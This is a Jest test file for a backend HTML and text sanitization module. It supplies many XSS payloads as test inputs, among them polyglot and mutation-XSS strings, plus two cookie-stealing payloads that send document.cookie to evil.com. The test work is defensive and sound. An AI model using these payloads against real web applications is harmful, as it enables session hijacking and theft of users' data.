import { describe, it, expect } from '@jest/globals';
import {
  sanitizeHtml,
  sanitizeText,
  sanitizeObject,
  sanitizeQueryParam
} from '../../../backend/src/utils/sanitization';

describe('Sanitization Utils', () => {
  describe('sanitizeHtml', () => {
    it('should remove script tags', () => {
      const dirty = '<p>Hello</p><script>alert("XSS")</script>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).toContain('<p>Hello</p>');
    });

    it('should remove onclick handlers', () => {
      const dirty = '<div onclick="alert(\'XSS\')">Click me</div>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('onclick');
    });

    it('should remove javascript: protocol', () => {
      const dirty = '<a href="javascript:alert(\'XSS\')">Link</a>';
      const clean = sanitizeHtml(dirty);
      expect(clean).not.toContain('javascript:');
    });

    it('should throw error on excessive length', () => {
      const dirty = 'a'.repeat(20000);
      expect(() => sanitizeHtml(dirty, { maxLength: 1000 })).toThrow();
    });

    it('should allow whitelisted tags', () => {
      const dirty = '<p>Hello</p><script>alert("XSS")</script>';
      const clean = sanitizeHtml(dirty, { allowedTags: ['p'] });
      expect(clean).toContain('<p>Hello</p>');
      expect(clean).not.toContain('<script>');
    });
  });

  describe('sanitizeText', () => {
    it('should strip all HTML tags', () => {
      const dirty = '<p>Hello <strong>World</strong></p>';
      const clean = sanitizeText(dirty);
      expect(clean).toBe('Hello World');
    });

    it('should remove script tags and keep text content', () => {
      const dirty = 'Hello<script>alert("XSS")</script>World';
      const clean = sanitizeText(dirty);
      expect(clean).not.toContain('<script>');
      expect(clean).toContain('HelloWorld');
    });

    it('should handle common XSS payloads', () => {
      const payloads = [
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="javascript:alert(1)"></iframe>',
        '"><script>alert(String.fromCharCode(88,83,83))</script>',
        '<input onfocus=alert(1) autofocus>'
      ];

      payloads.forEach(payload => {
        const clean = sanitizeText(payload);
        expect(clean).not.toContain('<script>');
        expect(clean).not.toContain('javascript:');
        expect(clean).not.toContain('onerror');
        expect(clean).not.toContain('onload');
        expect(clean).not.toContain('onfocus');
      });
    });

    it('should throw error on excessive length', () => {
      const dirty = 'a'.repeat(20000);
      expect(() => sanitizeText(dirty, 1000)).toThrow();
    });

    it('should handle unicode and special characters', () => {
      const dirty = 'Hello 世界 🌍 <script>alert(1)</script>';
      const clean = sanitizeText(dirty);
      expect(clean).toContain('世界');
      expect(clean).toContain('🌍');
      expect(clean).not.toContain('<script>');
    });
  });

  describe('sanitizeObject', () => {
    it('should sanitize all string properties', () => {
      const dirty = {
        name: '<script>alert(1)</script>John',
        email: 'test@example.com<img src=x onerror=alert(1)>'
      };
      const clean = sanitizeObject(dirty);
      expect(clean.name).not.toContain('<script>');
      expect(clean.email).not.toContain('<img');
      expect(clean.name).toContain('John');
    });

    it('should handle nested objects', () => {
      const dirty = {
        user: {
          name: '<script>alert(1)</script>John',
          profile: {
            bio: '<img src=x onerror=alert(1)>Hello'
          }
        }
      };
      const clean = sanitizeObject(dirty);
      expect(clean.user.name).not.toContain('<script>');
      expect(clean.user.profile.bio).not.toContain('<img');
    });

    it('should handle arrays', () => {
      const dirty = {
        tags: [
          '<script>alert(1)</script>tag1',
          'tag2<img src=x onerror=alert(1)>',
          'tag3'
        ]
      };
      const clean = sanitizeObject(dirty);
      expect(clean.tags[0]).not.toContain('<script>');
      expect(clean.tags[1]).not.toContain('<img');
      expect(clean.tags[2]).toBe('tag3');
    });

    it('should preserve non-string values', () => {
      const dirty = {
        name: '<script>alert(1)</script>John',
        age: 25,
        active: true,
        score: null
      };
      const clean = sanitizeObject(dirty);
      expect(clean.age).toBe(25);
      expect(clean.active).toBe(true);
      expect(clean.score).toBe(null);
    });

    it('should handle arrays of objects', () => {
      const dirty = {
        users: [
          { name: '<script>alert(1)</script>John' },
          { name: 'Jane<img src=x onerror=alert(1)>' }
        ]
      };
      const clean = sanitizeObject(dirty);
      expect(clean.users[0].name).not.toContain('<script>');
      expect(clean.users[1].name).not.toContain('<img');
    });
  });

  describe('sanitizeQueryParam', () => {
    it('should sanitize single string values', () => {
      const dirty = '<script>alert(1)</script>test';
      const clean = sanitizeQueryParam(dirty);
      expect(clean).not.toContain('<script>');
    });

    it('should sanitize array values', () => {
      const dirty = [
        '<script>alert(1)</script>val1',
        'val2<img src=x onerror=alert(1)>'
      ];
      const clean = sanitizeQueryParam(dirty);
      expect(Array.isArray(clean)).toBe(true);
      if (Array.isArray(clean)) {
        expect(clean[0]).not.toContain('<script>');
        expect(clean[1]).not.toContain('<img');
      }
    });

    it('should enforce 1000 char limit', () => {
      const dirty = 'a'.repeat(2000);
      expect(() => sanitizeQueryParam(dirty)).toThrow();
    });

    it('should handle common query param XSS attempts', () => {
      const attacks = [
        '?search=<script>alert(1)</script>',
        '?redirect=javascript:alert(1)',
        '?name=<img src=x onerror=alert(1)>'
      ];

      attacks.forEach(attack => {
        const value = attack.split('=')[1];
        const clean = sanitizeQueryParam(value);
        expect(typeof clean === 'string' && clean).not.toContain('<script>');
        expect(typeof clean === 'string' && clean).not.toContain('javascript:');
        expect(typeof clean === 'string' && clean).not.toContain('onerror');
      });
    });
  });

  describe('Real-world attack scenarios', () => {
    it('should prevent stored XSS in proposal titles', () => {
      const maliciousTitle = '"><script>document.cookie</script>';
      const clean = sanitizeText(maliciousTitle, 200);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('document.cookie');
    });

    it('should prevent DOM-based XSS in error messages', () => {
      const maliciousError = {
        message: '<img src=x onerror="fetch(\'evil.com?c=\'+document.cookie)">',
        details: {
          stack: '<script>new Image().src="evil.com?c="+document.cookie</script>'
        }
      };
      const clean = sanitizeObject(maliciousError);
      expect(clean.message).not.toContain('onerror');
      expect(clean.details.stack).not.toContain('<script>');
    });

    it('should prevent reflected XSS in search queries', () => {
      const maliciousSearch = '?q=<svg/onload=alert(document.domain)>';
      const query = maliciousSearch.split('=')[1];
      const clean = sanitizeQueryParam(query);
      expect(typeof clean === 'string' && clean).not.toContain('<svg');
      expect(typeof clean === 'string' && clean).not.toContain('onload');
    });

    it('should handle polyglot XSS payloads', () => {
      const polyglot = 'javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>';
      const clean = sanitizeText(polyglot);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('onload');
      expect(clean).not.toContain('onmouseover');
      expect(clean).not.toContain('javascript:');
    });

    it('should handle mutation XSS attempts', () => {
      const mutations = [
        '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
        '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
        '<svg><style><img/src=x onerror=alert(1)></style></svg>'
      ];

      mutations.forEach(mutation => {
        const clean = sanitizeText(mutation);
        expect(clean).not.toContain('onerror');
        expect(clean).not.toContain('<img');
      });
    });
  });
});
